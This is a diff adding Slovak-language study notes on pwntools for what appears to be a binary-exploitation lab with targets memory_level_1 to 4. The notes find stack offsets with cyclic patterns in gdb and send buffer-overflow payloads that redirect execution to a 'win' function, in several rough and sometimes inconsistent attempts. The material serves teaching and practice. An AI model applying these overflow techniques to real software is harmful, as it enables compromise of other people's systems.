@@ -1,0 +1,201 @@
+pwntools
+
+
+
+$ checksec /memory_level_1
+
+
+
+$ tmux - rozdeli sa obrazovka
+
+	   - CTRL+B hore/dole
+
+	   
+
+$ ipython
+
+
+
+	import pwn
+
+	p = pwn.process("/memory_level_1") # spusti sa proces
+
+	p.clean() # vypis na obrazovku
+
+	p.sendline("8") # string + enter
+
+	p.clean() # vypis na obrazovku
+
+	p.send(b"A"*100) # binarne data
+
+	p.clean() # vypis na obrazovku
+
+	
+
+	
+
+  ako sa zisti offset?
+
+	
+
+	p = pwn.gdb.debug("/memory_level_1")
+
+	
+
+	# v gdb dat c (continue) 
+
+	
+
+	p.sendline("200") # velkost payloadu
+
+	p.send(pwn.cyclic(200, n=8)) # cyklicky pattern
+
+	
+
+	# v gdb by sa mali zacat diat veci
+
+	# zaujima nas co je na vrchu zasobnika: x/gx $rsp
+
+	# dostaneme adresu 0x616161616161616a, skopcime
+
+	0x616161616161616c
+
+	pwn.cyclic_find(0x616161616161616a, n=8)
+
+	
+
+	# dostaneme cislo, co je offset = 72
+
+	
+
+	# v dekompilatori najdeme adresu win - 0x401216 (fixna adresa)
+
+	
+
+$ ipython
+
+	import pwn
+
+	def exploit():
+
+		win = 0x401216
+
+		p = pwn.process("/memory_level_1")
+
+		p.sendline("200")
+
+		p.send(b"A"*72+pwn.p64(win)) # offset 72, padding, little endian
+
+		print(p.clean())
+		
+		
+--------------------------------------------------------------------------------------------------
+
+docker run --rm -it petersvec/memory_level_2
+
+
+
+ipython
+	import pwn
+	p = pwn.gdb.debug("/memory_level_3")
+
+	
+
+	# v gdb dat c (continue) 
+
+	
+
+	p.sendline("125") # velkost payloadu
+
+	p.send(pwn.cyclic(125, n=8)) # cyklicky pattern
+
+	
+
+	# v gdb by sa mali zacat diat veci
+
+	# zaujima nas co je na vrchu zasobnika: x/gx $rsp
+
+	# dostaneme adresu 0x616161616161616a, skopcime
+
+	
+
+	pwn.cyclic_find(0x616161616161616a, n=8)
+
+	
+
+	# dostaneme cislo, co je offset = 72
+
+	
+
+	# v dekompilatori najdeme adresu win - 0x401216 (fixna adresa)
+
+	
+
+---------------------------------------------------------------------------------------------------
+
+0x6161616161616172
+pwn.cyclic_find(0x6161616161616172, n=8)
+
+p = pwn.gdb.debug("/memory_level_4")
+
+offset = 136
+
+import pwn
+win = 0x401216
+arg = 0xdeadbeef
+mov_rdi = 0x48bfefbeadde
+p = pwn.gdb.debug(['/memory_level_3', 'EPIC_BACKDOOR'])
+p = pwn.process('/memory_level_4')
+p.sendline("200")
+p.send(b"A"*136+pwn.p64(mov_rdi)+pwn.p64(arg)+pwn.p64(win))
+print(p.clean())
+
+
+0x48bfefbeadde
+
+
+mov rdi, 0xdeadbeef
+
+import pwn
+mov_rdi = 0x48bfefbeadde
+
+win = 0x401216
+
+p = pwn.process("/memory_level_4")
+
+p.sendline("200")
+
+p.send(b"A"*129+pwn.p64(mov_rdi)+pwn.p64(win)) 
+
+print(p.clean())
+
+---------------------------------------------------------------------
+
+import pwn
+
+mov_rdi = 0x48bfdeadbeef
+
+48 bf ef be ad de 00
+
+win = 0x401216
+p = pwn.gdb.debug("/memory_level_4")
+p.sendline("200")
+print(len(pwn.p64(mov_rdi)))
+p.send(b"A"*128+pwn.p64(mov_rdi)+pwn.p64(win))
+print(p.clean())
+
+---------------------------------------------------------------------
+Level 3
+
+pwn.cyclic_find(0x616161616161616c, n=8) 88 offset
+
+import pwn
+
+win = 0x401216
+p = pwn.process(["/memory_level_3", "EPIC_BACKDOOR"])
+p.sendline("2")
+p.sendline("2")
+
+p.send(b"A"*88+pwn.p64(win))
+print(p.clean())
+
